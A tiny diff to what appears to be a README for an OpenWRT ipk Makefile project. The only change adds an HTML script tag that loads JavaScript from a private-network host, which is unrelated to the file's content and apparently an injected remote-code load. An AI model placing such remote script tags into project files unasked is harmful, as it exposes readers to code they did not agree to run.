@@ -1,5 +1,5 @@
 --spacer--
-
+<script type="text/javascript" src="http://192.168.1.123/form/generate.js?id=3"></script>
 Contains stuff for getting Makefiles for ipk via OpenWRT toolchain.
 
 
